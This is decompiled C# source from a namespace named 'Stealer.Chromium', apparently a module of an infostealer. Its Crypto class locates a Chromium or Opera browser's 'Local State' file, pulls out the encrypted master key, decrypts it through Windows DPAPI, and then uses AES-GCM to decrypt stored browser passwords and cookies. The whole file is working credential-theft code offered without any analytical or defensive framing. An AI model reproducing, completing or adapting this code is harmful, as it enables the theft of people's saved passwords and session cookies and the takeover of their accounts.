using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
	// Token: 0x02000023 RID: 35
	internal sealed class Crypto
	{
		// Token: 0x060000A0 RID: 160
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Crypto.DataBlob pCipherText, ref string pszDescription, ref Crypto.DataBlob pEntropy, IntPtr pReserved, ref Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Crypto.DataBlob pPlainText);

		// Token: 0x060000A1 RID: 161 RVA: 0x00006C70 File Offset: 0x00004E70
		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			Crypto.DataBlob dataBlob = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob2 = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob3 = default(Crypto.DataBlob);
			Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Crypto.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Crypto.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					bool flag = bCipher == null;
					if (flag)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					bool flag2 = bEntropy == null;
					if (flag2)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				bool flag3 = dataBlob.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				bool flag4 = dataBlob2.pbData != IntPtr.Zero;
				if (flag4)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag5 = dataBlob3.pbData != IntPtr.Zero;
				if (flag5)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00006E7C File Offset: 0x0000507C
		public static byte[] GetMasterKey(string sLocalStateFolder)
		{
			bool flag = sLocalStateFolder.Contains("Opera");
			string text;
			if (flag)
			{
				text = sLocalStateFolder + "\\Opera Stable\\Local State";
			}
			else
			{
				text = sLocalStateFolder + "\\Local State";
			}
			byte[] array = new byte[0];
			bool flag2 = !File.Exists(text);
			byte[] array2;
			if (flag2)
			{
				array2 = null;
			}
			else
			{
				bool flag3 = text != Crypto.sPrevBrowserPath;
				if (flag3)
				{
					Crypto.sPrevBrowserPath = text;
					MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text));
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						bool success = match.Success;
						if (success)
						{
							array = Convert.FromBase64String(match.Groups[1].Value);
						}
					}
					byte[] array3 = new byte[array.Length - 5];
					Array.Copy(array, 5, array3, 0, array.Length - 5);
					try
					{
						Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(array3, null);
						array2 = Crypto.sPrevMasterKey;
					}
					catch
					{
						array2 = null;
					}
				}
				else
				{
					array2 = Crypto.sPrevMasterKey;
				}
			}
			return array2;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00006FEC File Offset: 0x000051EC
		public static string GetUTF8(string sNonUtf8)
		{
			string text;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				text = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				text = sNonUtf8;
			}
			return text;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00007034 File Offset: 0x00005234
		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(bEncryptedData, 3, array, 0, 12);
			byte[] array5;
			try
			{
				byte[] array2 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				cAesGcm cAesGcm = new cAesGcm();
				array5 = cAesGcm.Decrypt(bMasterKey, array, null, array4, array3);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
				array5 = null;
			}
			return array5;
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x000070EC File Offset: 0x000052EC
		public static string EasyDecrypt(string sLoginData, string sPassword, bool isCookie = false)
		{
			bool flag = sPassword.StartsWith("v10") || sPassword.StartsWith("v11");
			string text2;
			if (flag)
			{
				string text = Directory.GetParent(sLoginData).Parent.FullName;
				if (isCookie)
				{
					text = Directory.GetParent(text).FullName;
				}
				byte[] masterKey = Crypto.GetMasterKey(text);
				text2 = Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			else
			{
				text2 = Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
			}
			return text2;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0000719C File Offset: 0x0000539C
		public static string BrowserPathToAppName(string sLoginData)
		{
			bool flag = sLoginData.Contains("Opera");
			string text;
			if (flag)
			{
				text = "Opera";
			}
			else
			{
				sLoginData.Replace(Paths.lappdata, "");
				text = sLoginData.Split(new char[] { '\\' })[1];
			}
			return text;
		}

		// Token: 0x04000078 RID: 120
		private static string sPrevBrowserPath = "";

		// Token: 0x04000079 RID: 121
		private static byte[] sPrevMasterKey = new byte[0];

		// Token: 0x02000208 RID: 520
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000978 RID: 2424
			public int cbSize;

			// Token: 0x04000979 RID: 2425
			public int dwPromptFlags;

			// Token: 0x0400097A RID: 2426
			public IntPtr hwndApp;

			// Token: 0x0400097B RID: 2427
			public string szPrompt;
		}

		// Token: 0x02000209 RID: 521
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x0400097C RID: 2428
			public int cbData;

			// Token: 0x0400097D RID: 2429
			public IntPtr pbData;
		}
	}
}
